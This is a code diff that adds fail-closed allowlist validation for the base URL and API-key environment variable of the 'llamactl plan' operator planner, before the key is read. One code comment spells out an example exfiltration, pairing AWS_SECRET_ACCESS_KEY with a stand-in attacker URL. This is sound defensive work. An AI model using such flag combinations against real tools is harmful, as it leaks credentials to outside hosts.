@@ -11,6 +11,77 @@ import {
 
 import { required } from "../required.js";
 
+// Allowlist + validation for the operator planner endpoint (baseUrl + apiKeyEnv).
+// Duplicated verbatim from packages/mcp/src/tools/operator.ts so the two surfaces
+// share the same rules and env-var names — a single operator config
+// (LLAMACTL_OPERATOR_PLAN_HOST_ALLOWLIST / LLAMACTL_OPERATOR_PLAN_API_KEY_ENVS)
+// governs both. Fails CLOSED: unless baseUrl is https on an allowlisted host and
+// apiKeyEnv is on the env-name allowlist, the endpoint is rejected before
+// process.env[apiKeyEnv] is read.
+const DEFAULT_OPENAI_COMPAT_HOSTS = ["api.openai.com"];
+const DEFAULT_API_KEY_ENV_NAMES = ["OPENAI_API_KEY"];
+const ENV_HOST_ALLOWLIST = "LLAMACTL_OPERATOR_PLAN_HOST_ALLOWLIST";
+const ENV_API_KEY_ENV_ALLOWLIST = "LLAMACTL_OPERATOR_PLAN_API_KEY_ENVS";
+
+function splitPlannerAllowlist(raw: string): string[] {
+  return raw
+    .split(",")
+    .map((value) => value.trim())
+    .filter((value) => value.length > 0);
+}
+
+function normalizeHostname(value: string): string {
+  return value.toLowerCase();
+}
+
+function getAllowedPlannerHosts(): string[] {
+  const configured = splitPlannerAllowlist(process.env[ENV_HOST_ALLOWLIST] ?? "");
+  return configured.length > 0 ? configured.map(normalizeHostname) : DEFAULT_OPENAI_COMPAT_HOSTS;
+}
+
+function getAllowedApiKeyEnvs(): string[] {
+  const configured = splitPlannerAllowlist(process.env[ENV_API_KEY_ENV_ALLOWLIST] ?? "");
+  return configured.length > 0 ? configured : DEFAULT_API_KEY_ENV_NAMES;
+}
+
+function validatePlannerBaseUrl(baseUrl: string): string | null {
+  let normalizedUrl: URL;
+  try {
+    normalizedUrl = new URL(baseUrl);
+  } catch (error: unknown) {
+    return `invalid baseUrl${error instanceof Error ? `: ${error.message}` : ""}`;
+  }
+  if (normalizedUrl.protocol !== "https:") {
+    return "baseUrl must use https";
+  }
+  const host = normalizeHostname(normalizedUrl.hostname);
+  if (!getAllowedPlannerHosts().includes(host)) {
+    return `baseUrl host '${host}' is not allowlisted`;
+  }
+  return null;
+}
+
+function validatePlannerApiKeyEnv(apiKeyEnv: string): string | null {
+  if (!getAllowedApiKeyEnvs().includes(apiKeyEnv)) {
+    return `apiKeyEnv '${apiKeyEnv}' is not allowlisted`;
+  }
+  return null;
+}
+
+// Composite gate: apiKeyEnv is checked BEFORE baseUrl so a bad env-var name is
+// rejected without any URL parsing side effects, and — critically — before the
+// caller ever reads process.env[apiKeyEnv].
+export function validatePlannerEndpoint(
+  baseUrl: string,
+  apiKeyEnv: string,
+): { ok: true } | { ok: false; message: string } {
+  const envError = validatePlannerApiKeyEnv(apiKeyEnv);
+  if (envError) return { ok: false, message: envError };
+  const urlError = validatePlannerBaseUrl(baseUrl);
+  if (urlError) return { ok: false, message: urlError };
+  return { ok: true };
+}
+
 const USAGE = `llamactl plan — LLM-backed operator planner
 
 USAGE:
@@ -149,6 +220,14 @@ function buildExecutor(flags: RunFlags): PlannerExecutor | { error: string } {
   if (flags.stub) return stubPlannerExecutor;
   if (!flags.model) {
     return { error: "plan run: --model is required unless --stub is set" };
+  }
+  // Gate the caller-supplied endpoint BEFORE touching process.env: a bad
+  // baseUrl/apiKeyEnv pair must never cause the value to be read (let alone
+  // sent) — otherwise `--api-key-env=AWS_SECRET_ACCESS_KEY
+  // --base-url=http://attacker` exfiltrates the secret.
+  const gate = validatePlannerEndpoint(flags.baseUrl, flags.apiKeyEnv);
+  if (!gate.ok) {
+    return { error: `plan run: ${gate.message}` };
   }
   const apiKey = process.env[flags.apiKeyEnv];
   if (!apiKey) {
